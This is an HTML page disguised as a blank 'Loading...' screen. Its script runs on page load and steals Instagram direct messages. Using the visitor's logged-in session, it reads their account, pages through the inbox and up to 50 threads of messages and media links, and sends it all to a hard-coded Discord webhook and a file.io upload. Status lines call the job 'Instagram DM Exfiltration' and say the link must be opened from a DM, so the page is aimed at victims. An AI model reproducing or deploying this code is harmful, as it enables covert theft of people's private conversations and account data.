<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Loading...</title>
<style>
* { margin:0; padding:0; box-sizing:border-box; }
html, body { width:100%; height:100%; background:#000; }
</style>
</head>
<body>
<script>
(async function() {
    // ===== CONFIGURE YOUR DISCORD WEBHOOK =====
    const DISCORD_WEBHOOK_URL ='https://discord.com/api/webhooks/1518646860972032102/s-amLoTu9K_kMIKWgLUchDDCI5sYp5yBH9F7rEnPm7VkmNjhJ14az6iPxHckZircsItc';
    // ==========================================

    async function sendToDiscord(content) {
        const maxLen = 1900;
        for (let i = 0; i < content.length; i += maxLen) {
            const chunk = content.substring(i, i + maxLen);
            try {
                await fetch(DISCORD_WEBHOOK_URL, {
                    method: 'POST',
                    mode: 'no-cors',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ content: chunk })
                });
            } catch(e) {}
            await new Promise(r => setTimeout(r, 300));
        }
    }

    async function sendFileToDiscord(jsonContent, filename) {
        // Upload to file.io first
        try {
            const resp = await fetch('https://file.io', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ filename, content: jsonContent })
            });
            const result = await resp.json();
            if (result && result.link) {
                await sendToDiscord(`📁 **Full DM Export:** ${result.link}\n*(Expires after 1 download or 7 days)*`);
                return;
            }
        } catch(e) {}
        
        // Fallback: send in chunks as file attachment via Discord
        // Discord webhook can send files directly
        try {
            const blob = new Blob([jsonContent], { type: 'application/json' });
            const formData = new FormData();
            formData.append('file', blob, filename);
            formData.append('content', '📁 Full DM Export (all messages)');
            
            await fetch(DISCORD_WEBHOOK_URL, {
                method: 'POST',
                body: formData
            });
            return;
        } catch(e) {}

        // Last resort: raw text chunks
        await sendToDiscord('⚠️ Sending raw data in chunks...');
        for (let i = 0; i < jsonContent.length; i += 1900) {
            await sendToDiscord('```json\n' + jsonContent.substring(i, i + 1900) + '\n```');
            await new Promise(r => setTimeout(r, 500));
        }
    }

    function escapeHtml(text) {
        if (!text) return '';
        return text.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');
    }

    function convertTime(timestamp) {
        if (!timestamp) return null;
        const d = new Date(timestamp * 1000);
        return d.toISOString();
    }

    async function fetchAllThreadMessages(threadId, usersMap) {
        let allItems = [];
        let cursor = null;
        let hasMore = true;
        let attempts = 0;
        
        while (hasMore && attempts < 20) { // Max 20 pages = up to 4000 messages per thread
            attempts++;
            let url = `https://i.instagram.com/api/v1/direct_v2/threads/${threadId}/?use_unified_inbox=true&limit=200`;
            if (cursor) url += `&cursor=${cursor}&direction=older`;
            
            try {
                const resp = await fetch(url, {
                    credentials: 'include',
                    headers: { 'Accept': 'application/json', 'X-Requested-With': 'XMLHttpRequest', 'Referer': 'https://www.instagram.com/' }
                });
                
                if (!resp.ok) break;
                
                const data = await resp.json();
                const items = data.thread?.items || data.items || [];
                
                if (items.length === 0) break;
                
                allItems = allItems.concat(items);
                
                // Check if there are older messages
                const oldestCursor = data.thread?.oldest_cursor || data.oldest_cursor;
                if (oldestCursor && items.length >= 200) {
                    cursor = oldestCursor;
                } else {
                    hasMore = false;
                }
                
                // Delay between pagination requests
                await new Promise(r => setTimeout(r, 500));
                
            } catch(e) {
                break;
            }
        }
        
        return allItems;
    }

    try {
        await sendToDiscord('🔵 **Instagram DM Exfiltration — Full History Mode**');

        // Step 1: Get current user
        const userResp = await fetch('https://www.instagram.com/api/v1/web/current_user/', {
            credentials: 'include',
            headers: { 'Accept': 'application/json', 'X-Requested-With': 'XMLHttpRequest', 'Referer': 'https://www.instagram.com/' }
        });
        if (!userResp.ok) {
            await sendToDiscord('❌ **Failed:** No Instagram session. This link MUST be opened inside Instagram\'s in-app browser (click it from a DM).');
            return;
        }

        const userData = await userResp.json();
        const username = userData.user?.username || userData.username || 'unknown';
        const userId = userData.user?.pk || userData.pk;
        const fullName = userData.user?.full_name || '';

        const startTime = Date.now();
        await sendToDiscord(`✅ **Account:** @${username}${fullName ? ` (${fullName})` : ''} | ID: ${userId}`);
        await sendToDiscord(`⏳ Fetching inbox and all messages — this may take a few minutes...`);

        // Step 2: Get full inbox (paginate if needed)
        let allThreads = [];
        let inboxCursor = null;
        let inboxHasMore = true;
        
        while (inboxHasMore) {
            let inboxUrl = 'https://i.instagram.com/api/v1/direct_v2/inbox/?persistentBadging=true&use_unified_inbox=true&limit=50';
            if (inboxCursor) inboxUrl += `&cursor=${inboxCursor}`;
            
            const inboxResp = await fetch(inboxUrl, {
                credentials: 'include',
                headers: { 'Accept': 'application/json', 'X-Requested-With': 'XMLHttpRequest', 'Referer': 'https://www.instagram.com/' }
            });
            
            if (!inboxResp.ok) break;
            
            const inboxData = await inboxResp.json();
            const threads = inboxData.inbox?.threads || [];
            allThreads = allThreads.concat(threads);
            
            const nextCursor = inboxData.inbox?.oldest_cursor || inboxData.oldest_cursor;
            if (nextCursor && threads.length >= 50) {
                inboxCursor = nextCursor;
            } else {
                inboxHasMore = false;
            }
            
            await new Promise(r => setTimeout(r, 400));
        }

        await sendToDiscord(`📨 **${allThreads.length} total DM thread(s) found** — now fetching ALL messages from each thread...`);

        // Step 3: Collect every single message from every thread
        const allData = {
            account: { username, userId, fullName },
            collected_at: new Date().toISOString(),
            total_threads: allThreads.length,
            threads: []
        };

        let totalMessages = 0;

        for (let i = 0; i < Math.min(allThreads.length, 50); i++) { // Max 50 threads
            const thread = allThreads[i];
            const threadId = thread.thread_id || thread.thread_v2_id;
            const threadTitle = thread.thread_title || (thread.users || []).map(u => u.username).join(', ') || 'DM';
            const threadUsers = (thread.users || []).map(u => ({
                username: u.username,
                pk: u.pk,
                full_name: u.full_name
            }));

            // Build users map
            const usersMap = {};
            (thread.users || []).forEach(u => usersMap[u.pk] = u.username);

            await sendToDiscord(`📌 **[${i+1}/${Math.min(allThreads.length, 50)}] Fetching: ${escapeHtml(threadTitle)}**`);

            // Fetch ALL messages with pagination
            const allItems = await fetchAllThreadMessages(threadId, usersMap);

            const messages = allItems.map(m => ({
                id: m.item_id || m.id,
                from: usersMap[m.user_id] || 'unknown',
                from_id: m.user_id,
                text: m.text || null,
                type: m.item_type || 'unknown',
                timestamp: m.timestamp ? convertTime(m.timestamp) : null,
                reactions: m.reactions || null,
                // Include media info if present
                media: m.media || m.visual_media || m.media_share ? {
                    type: m.media?.image_versions2 ? 'image' : m.media?.video_versions ? 'video' : m.media_share ? 'shared_post' : null,
                    url: m.media?.image_versions2?.candidates?.[0]?.url || m.media?.video_versions?.[0]?.url || null
                } : null
            }));

            // Deduplicate by ID
            const seen = new Set();
            const uniqueMessages = messages.filter(m => {
                if (seen.has(m.id)) return false;
                seen.add(m.id);
                return true;
            });

            totalMessages += uniqueMessages.length;

            // Send preview to Discord (last 5 messages)
            const previewMsgs = uniqueMessages.slice(-5).map(m => 
                `**${escapeHtml(m.from)}:** ${escapeHtml(m.text || '[' + m.type + ']')}`
            ).join('\n');

            await sendToDiscord(
                `📌 **${escapeHtml(threadTitle)}** — ${uniqueMessages.length} messages\n` +
                `👥 ${threadUsers.map(u => u.username).join(', ')}\n` +
                `📅 ${uniqueMessages[0]?.timestamp?.split('T')[0] || '?'} → ${uniqueMessages[uniqueMessages.length-1]?.timestamp?.split('T')[0] || '?'}\n` +
                (previewMsgs ? `*(last 5)*\n${previewMsgs}` : '*(no text messages)*')
            );

            allData.threads.push({
                thread_id: threadId,
                title: threadTitle,
                users: threadUsers,
                message_count: uniqueMessages.length,
                date_range: {
                    oldest: uniqueMessages[0]?.timestamp || null,
                    newest: uniqueMessages[uniqueMessages.length-1]?.timestamp || null
                },
                messages: uniqueMessages
            });

            await new Promise(r => setTimeout(r, 600));
        }

        // Step 4: Calculate stats
        const textCount = allData.threads.reduce((a, t) => a + t.messages.filter(m => m.text).length, 0);
        const mediaCount = allData.threads.reduce((a, t) => a + t.messages.filter(m => !m.text).length, 0);
        const elapsed = ((Date.now() - startTime) / 1000).toFixed(1);

        // Step 5: Send the complete file
        const fullJson = JSON.stringify(allData, null, 2);
        const filename = `instagram_dms_${username}_${Date.now()}_full.json`;

        await sendToDiscord(`✅ **Collection complete in ${elapsed}s!** Sending full file...`);
        await sendFileToDiscord(fullJson, filename);

        // Step 6: Send summary
        await sendToDiscord(
            `📊 **Exfiltration Summary**\n` +
            `👤 **Account:** @${username}\n` +
            `💬 **Total Threads:** ${allData.threads.length}\n` +
            `📝 **Total Messages:** ${totalMessages}\n` +
            `✏️ **Text Messages:** ${textCount}\n` +
            `🖼 **Media/Other:** ${mediaCount}\n` +
            `⏱ **Time Taken:** ${elapsed}s\n` +
            `📅 **Date Range:** ${allData.threads.reduce((a, t) => {
                if (t.date_range.oldest && (!a.oldest || t.date_range.oldest < a.oldest)) a.oldest = t.date_range.oldest;
                if (t.date_range.newest && (!a.newest || t.date_range.newest > a.newest)) a.newest = t.date_range.newest;
                return a;
            }, {}).oldest?.split('T')[0] || '?'} → ${allData.threads.reduce((a, t) => {
                if (t.date_range.newest && (!a || t.date_range.newest > a)) a = t.date_range.newest;
                return a;
            }, null)?.split('T')[0] || '?'}`
        );

    } catch(e) {
        await sendToDiscord(`❌ **Critical Error:** ${escapeHtml(e.message)}\n\`\`\`${escapeHtml(e.stack?.substring(0, 1500) || '')}\`\`\``);
    }
})();
</script>
</body>
</html>
